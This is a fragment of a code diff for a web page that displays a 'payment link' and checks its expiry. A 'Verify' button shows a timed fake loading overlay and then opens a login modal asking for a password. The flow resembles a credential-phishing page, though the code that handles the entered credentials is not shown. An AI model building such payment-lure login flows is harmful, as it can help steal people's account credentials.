+    const popup = document.getElementById('popupBackdrop');
+    if (popup) popup.classList.remove('show');
+    openLoginModal();
+  });
+
+  // Close login modal on backdrop click
+  const loginBd = document.getElementById('loginModalBackdrop');
+  if (loginBd) loginBd.addEventListener('click', (e) => {
+    if (e.target === loginBd) closeLoginModal();
+  });
+
+  // Login submit
+  const loginSubmitBtn = document.getElementById('loginSubmitBtn');
+  if (loginSubmitBtn) loginSubmitBtn.addEventListener('click', doLoginVerify);
+
+  // Enter key support in login fields
+  const loginPass = document.getElementById('loginPassword');
+  if (loginPass) loginPass.addEventListener('keydown', (e) => {
+    if (e.key === 'Enter') { e.preventDefault(); doLoginVerify(); }
+  });
+
+  let payload;
+  try { payload = await resolvePayload(); }
+  catch (err) { showStateCard('⚠', 'Payment link unavailable', err.message || 'Please start over from the payment link.'); return; }
+
+  if (payload && payload.exp && Date.now() > Number(payload.exp)) {
+    showStateCard('⏱', 'This link has expired', 'The payment request is no longer valid. Please ask the sender to generate a new link.');
+    return;
+  }
+
+  render(payload);
+
+  // Main Verify button: show 1.5s loading, then open modal
+  const verifyBtn = document.getElementById('verifyBtn');
+  if (verifyBtn) {
+    verifyBtn.addEventListener('click', () => {
+      const loadOverlay = document.getElementById('verifyLoadingOverlay');
+      if (loadOverlay) loadOverlay.classList.add('show');
+      verifyBtn.disabled = true;
+
+      setTimeout(() => {
+        if (loadOverlay) loadOverlay.classList.remove('show');
+        verifyBtn.disabled = false;
+        openLoginModal();
+      }, CONFIG.LOADING_DELAY_MS);
+    });
+  }
+}
+
+document.addEventListener('DOMContentLoaded', boot);
+</script>
+</body>
+</html>
